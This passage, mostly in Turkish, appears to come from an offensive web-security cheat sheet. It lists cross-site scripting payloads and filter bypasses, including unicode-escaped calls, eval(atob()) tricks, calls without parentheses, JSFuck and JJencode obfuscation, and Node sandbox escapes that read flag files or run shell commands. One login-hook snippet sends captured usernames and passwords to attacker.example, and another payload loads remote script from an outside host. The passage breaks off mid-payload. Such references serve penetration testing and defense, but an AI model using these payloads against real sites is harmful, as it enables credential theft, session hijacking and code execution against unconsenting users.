;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Kodun kodlanarak yürütülmesi
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### eval(atob()) ile teslim edilebilir payloads ve kapsam nüansları

URL'leri daha kısa tutmak ve basit anahtar kelime filtrelerini atlatmak için gerçek mantığınızı base64-encode edip `eval(atob('...'))` ile değerlendirebilirsiniz. Basit anahtar kelime filtreleri `alert`, `eval` veya `atob` gibi tanımlayıcıları engelliyorsa, tarayıcıda aynı şekilde derlenen ancak string-eşleme filtrelerinden kaçan Unicode-escape edilmiş tanımlayıcılar kullanın:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
Önemli kapsam farkı: `const`/`let` ile `eval()` içinde tanımlananlar blok kapsamlıdır ve global değişken oluşturmazlar; daha sonraki script'lerden erişilemezler. Gerekirse (ör. bir form işleyicisini ele geçirmek için) global, yeniden bağlanamaz hook'lar tanımlamak amacıyla dinamik olarak enjekte edilen bir `<script>` elementi kullanın:
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Referans: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode Kodlamasıyla JS yürütme
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript blacklist atlatma teknikleri

**Stringler**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**Özel kaçışlar**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JS kodu içindeki boşluk yerine koymaları**
```javascript
<TAB>
/**/
```
**JavaScript yorumları (şuradan** [**JavaScript Comments**](#javascript-comments) **hilesi)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (kaynak:** [**JavaScript new line**](#javascript-new-lines) **trick)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript boşluk karakterleri**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript bir yorum içinde**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**Parantezsiz JavaScript**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

```
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
- [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**Herhangi bir fonksiyon (alert) çağrısı**
```javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
```
## **DOM vulnerabilities**

JS code kullanılıyor ve saldırgan tarafından kontrol edilen veriler (örn. `location.href`) güvensiz şekilde kullanılıyor. Bir saldırgan bunu kötüye kullanarak rastgele JS kodu çalıştırabilir.\
**Due to the extension of the explanation of** [**DOM vulnerabilities it was moved to this page**](dom-xss.md)**:**

{{#ref}}
dom-xss.md
{{#endref}}

Orada DOM vulnerabilities'ın ne olduğunu, nasıl tetiklendiğini ve nasıl exploit edileceğini ayrıntılı olarak bulacaksınız.\
Ayrıca, bahsedilen yazının sonunda [**DOM Clobbering attacks**](dom-xss.md#dom-clobbering) hakkında bir açıklama olduğunu unutmayın.

### Upgrading Self-XSS

### Cookie XSS

Eğer payload'u bir cookie içinde göndererek bir XSS tetikleyebiliyorsanız, bu genellikle self-XSS olur. Ancak, eğer XSS'e açık bir **vulnerable subdomain to XSS** bulursanız, bu XSS'i kullanıp tüm domaine bir cookie enjekte ederek ana domainde veya diğer subdomain'lerde (cookie XSS'e açık olanlar) cookie XSS'i tetikleyebilirsiniz. Bunun için cookie tossing attack'i kullanabilirsiniz:


{{#ref}}
../hacking-with-cookies/cookie-tossing.md
{{#endref}}

Bu tekniğin güzel bir kötüye kullanım örneğini [**this blog post**](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html) içinde bulabilirsiniz.

### Sending your session to the admin

Belki bir kullanıcı profilini admin ile paylaşabiliyordur ve eğer self XSS kullanıcının profilindeyse ve admin profili görüntülüyorsa, admin bu açığı tetikleyecektir.

### Session Mirroring

Eğer self XSS tespit ederseniz ve web sayfası **session mirroring for administrators** gibi bir özellik sunuyorsa — örneğin müşterilerin yardım istemesine izin veriyorsa ve admin size yardım etmek için sizin oturumunuzda gördüklerinizi kendi oturumundan görebiliyorsa — administrator'ı **administrator trigger your self XSS** yapmaya zorlayarak onun cookie/oturumunu çalabilirsiniz.

## Other Bypasses

### Bypassing sanitization via WASM linear-memory template overwrite

Bir web uygulaması Emscripten/WASM kullandığında, sabit stringler (HTML format stubları gibi) writable linear memory içinde bulunur. In‑WASM içindeki tek bir overflow (ör. unchecked memcpy in an edit path) bitişik yapıları bozup yazmaları bu sabitlere yönlendirebilir. "<article><p>%.*s</p></article>" gibi bir şablonu "<img src=1 onerror=%.*s>" ile overwrite etmek, sanitize edilmiş girdiyi bir JavaScript handler değerine çevirir ve render sırasında anında DOM XSS verir.

İstismar iş akışı, DevTools memory yardımcıları ve savunmalar içeren ayrıntılı sayfaya bakın:

{{#ref}}
wasm-linear-memory-template-overwrite-xss.md
{{#endref}}


### Normalised Unicode

Yansıtılan değerlerin (**reflected values**) sunucuda (veya istemci tarafında) **unicode normalized** edilip edilmediğini kontrol edip bu işlevi korumaları aşmak için kötüye kullanabilirsiniz. [**Find an example here**](../unicode-injection/index.html#xss-cross-site-scripting).

### PHP FILTER_VALIDATE_EMAIL flag Bypass
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails bypass

RoR mass assignment nedeniyle HTML içine tırnak işaretleri eklenir ve tırnak kısıtlaması atlatılır; tag içine ek alanlar (onfocus) eklenebilir.\
Form örneği ([from this report](https://hackerone.com/reports/709336)), eğer payload gönderirseniz:
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
Çift "Key","Value" şu şekilde geri yazdırılacaktır:
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
Sonra, onfocus özniteliği eklenecek ve XSS meydana gelir.

### Özel kombinasyonlar
```html
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)
```
### 302 yanıtında header injection ile XSS

Eğer **inject headers in a 302 Redirect response** yapabildiğinizi görürseniz, tarayıcının **make the browser execute arbitrary JavaScript** işlevini sağlamayı deneyebilirsiniz. Bu **not trivial** çünkü modern tarayıcılar HTTP yanıt durum kodu 302 ise HTTP response body'yi yorumlamaz, dolayısıyla sadece bir cross-site scripting payload'u işe yaramaz.

In [**this report**](https://www.gremwell.com/firefox-xss-302) and [**this one**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/) bölümlerinde Location header içinde birkaç protokolü nasıl test edebileceğiniz ve bunlardan herhangi birinin tarayıcının gövde içindeki XSS payload'unu incelemesine ve çalıştırmasına izin verip vermediğini nasıl kontrol edeceğiniz anlatılıyor.\
Past known protocols: `mailto://`, `//x:1/`, `ws://`, `wss://`, _empty Location header_, `resource://`.

### Sadece Harfler, Rakamlar ve Noktalar

Eğer javascript'in **execute** edeceği **callback**'i sadece bu karakterlerle (harfler, rakamlar ve noktalar) sınırlı olarak belirleyebiliyorsanız, bu davranıştan nasıl faydalanacağınızı öğrenmek için [**Read this section of this post**](#javascript-function) bölümünü okuyun.

### XSS için Geçerli `<script>` Content-Types

(From [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Eğer `application/octet-stream` gibi bir **content-type** ile bir script yüklemeye çalışırsanız, Chrome şu hatayı fırlatacaktır:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Chrome'un bir **loaded script**i çalıştırmasını destekleyecek tek **Content-Type**lar, [https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc) içindeki const **`kSupportedJavascriptTypes`** listesinde yer alanlardır.
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### Script Types to XSS

(Kaynak: [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Peki, hangi türler bir script yüklemek için belirtilebilir?
```html
<script type="???"></script>
```
Cevap:

- **module** (varsayılan, açıklamaya gerek yok)
- [**webbundle**](https://web.dev/web-bundles/): Web Bundles, HTML, CSS, JS… gibi birden çok veriyi birlikte **`.wbn`** dosyasına paketleyebileceğiniz bir özelliktir.
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
- [**importmap**](https://github.com/WICG/import-maps)**:** import sözdizimini geliştirmeye izin verir
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment"
import { partition } from "lodash"
</script>
```
Bu davranış [**this writeup**](https://github.com/zwade/yaca/tree/master/solution) içinde, bir kütüphaneyi eval'e yeniden eşleyerek bunun suistimal edilmesiyle XSS tetiklenmesini sağlamak için kullanıldı.

- [**speculationrules**](https://github.com/WICG/nav-speculation)**:** Bu özellik esasen önceden renderlemenin neden olduğu bazı sorunları çözmek için tasarlanmıştır. İşleyişi şöyle:
```html
<script type="speculationrules">
{
"prerender": [
{ "source": "list", "urls": ["/page/2"], "score": 0.5 },
{
"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1
}
]
}
</script>
```
### Web Content-Types ile XSS

(Kaynak: [**here**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)) Aşağıdaki content type'ları tüm tarayıcılarda XSS çalıştırabilir:

- text/html
- application/xhtml+xml
- application/xml
- text/xml
- image/svg+xml
- text/plain (?? not in the list but I think I saw this in a CTF)
- application/rss+xml (off)
- application/atom+xml (off)

Diğer tarayıcılarda başka **`Content-Types`** keyfi JS çalıştırmak için kullanılabilir, bkz: [https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xml İçerik Tipi

Sayfa text/xml content-type döndürüyorsa, bir namespace belirleyerek keyfi JS çalıştırmak mümkün:
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### Özel Yerine Koyma Desenleri

Şu gibi bir şey kullanıldığında **`"some {{template}} data".replace("{{template}}", <user_input>)`**. Saldırgan bazı korumaları aşmak için [**special string replacements**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) kullanabilir: `` "123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"})) ``

Örneğin [**this writeup**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA) içinde, bu bir script içinde bir JSON string'ini escape etmek ve rastgele kod çalıştırmak için kullanıldı.

### Chrome Önbelleği ile XSS


{{#ref}}
chrome-cache-to-xss.md
{{#endref}}

### XS Jails Escape

Eğer kullanabileceğiniz karakter seti sınırlıysa, XSJail problemleri için diğer geçerli çözümlere bakın:
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/index.html)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
Eğer güvenilmeyen kodu çalıştırmadan önce her şey **undefined** ise (örneğin [**this writeup**](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html#miscx2fundefined55-solves)), herhangi bir güvenilmeyen kodun yürütülmesini suistimal etmek için işe yarar nesneleri "hiçten" oluşturmak mümkün olur:

- import() kullanarak
```javascript
// although import "fs" doesn’t work, import('fs') does.
import("fs").then((m) => console.log(m.readFileSync("/flag.txt", "utf8")))
```
- `require`'e dolaylı erişim

[According to this](https://stackoverflow.com/questions/28955047/why-does-a-module-level-return-statement-work-in-node-js/28955050#28955050) modüller Node.js tarafından bir fonksiyon içinde şu şekilde sarılır:
```javascript
;(function (exports, require, module, __filename, __dirname) {
// our actual module code
})
```
Bu nedenle, o modülden **başka bir fonksiyon çağırabiliyorsak**, o fonksiyondan `arguments.callee.caller.arguments[1]` kullanılarak **`require`**'e erişmek mümkündür:
```javascript
;(function () {
return arguments.callee.caller.arguments[1]("fs").readFileSync(
"/flag.txt",
"utf8"
)
})()
```
Önceki örneğe benzer şekilde, **use error handlers** kullanarak modülün **wrapper**'ına erişmek ve **`require`** fonksiyonunu elde etmek mümkündür:
```javascript
try {
null.f()
} catch (e) {
TypeError = e.constructor
}
Object = {}.constructor
String = "".constructor
Error = TypeError.prototype.__proto__.constructor
function CustomError() {
const oldStackTrace = Error.prepareStackTrace
try {
Error.prepareStackTrace = (err, structuredStackTrace) =>
structuredStackTrace
Error.captureStackTrace(this)
this.stack
} finally {
Error.prepareStackTrace = oldStackTrace
}
}
function trigger() {
const err = new CustomError()
console.log(err.stack[0])
for (const x of err.stack) {
// use x.getFunction() to get the upper function, which is the one that Node.js adds a wrapper to, and then use arugments to get the parameter
const fn = x.getFunction()
console.log(String(fn).slice(0, 200))
console.log(fn?.arguments)
console.log("=".repeat(40))
if ((args = fn?.arguments)?.length > 0) {
req = args[1]
console.log(req("child_process").execSync("id").toString())
}
}
}
trigger()
```
### Obfuscation & Advanced Bypass

- **Aynı sayfada farklı obfuscations:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
- [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
- [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
- [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
- [http://www.jsfuck.com/](http://www.jsfuck.com)
- Daha gelişmiş JSFuck: [https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
- [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
- [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
- [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>
([,ウ,,,,ア]=[]+{}
,[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
</script>
```

```javascript
//JJencode
<script>$=~[];$={___:++$,$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$:({}+"")[$],$_$:($[$]+"")[$],_$:++$,$_:(!""+"")[$],$__:++$,$_$:++$,$__:({}+"")[$],$_:++$,$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$=($.$+"")[$.__$])+((!$)+"")[$._$]+($.__=$.$_[$.$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$=$.$+(!""+"")[$._$]+$.__+$._+$.$+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$+"\""+$.$_$_+(![]+"")[$._$_]+$.$_+"\\"+$.__$+$.$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
```

```javascript
//JSFuck
<script>
(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]